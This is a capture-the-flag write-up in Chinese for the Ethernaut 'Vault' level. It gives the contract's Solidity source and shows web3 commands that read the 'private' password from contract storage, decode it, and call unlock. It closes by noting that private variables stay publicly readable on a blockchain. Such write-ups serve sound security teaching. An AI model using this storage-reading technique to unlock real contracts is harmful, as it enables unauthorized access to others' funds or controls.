# Ethernaut CTF Writeup

## Level 8 Vault

> 題目: https://ethernaut.openzeppelin.com/level/0x5fFa62f6A01248A40C9B2857BdF6028b75d71693

原始碼:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

過關條件: 

- 打開金庫(Vault)

解法：

- 由於區塊鏈的公開透明特性，可以直接從合約的 storage 取得這些私有變數值 `web3.eth.getStorageAt(contract.address, 1)`
    - 解碼取得 password 值 `web3.utils.hexToAscii("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")`
    - Exploit `contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")`

Takeaways

- 將一個變數設成私用變數(private variable)，只能保證這個變數不被其他合約存取。設成私用的(private)狀態變數和本地變數，還是可以被公開的存取(publicly access)。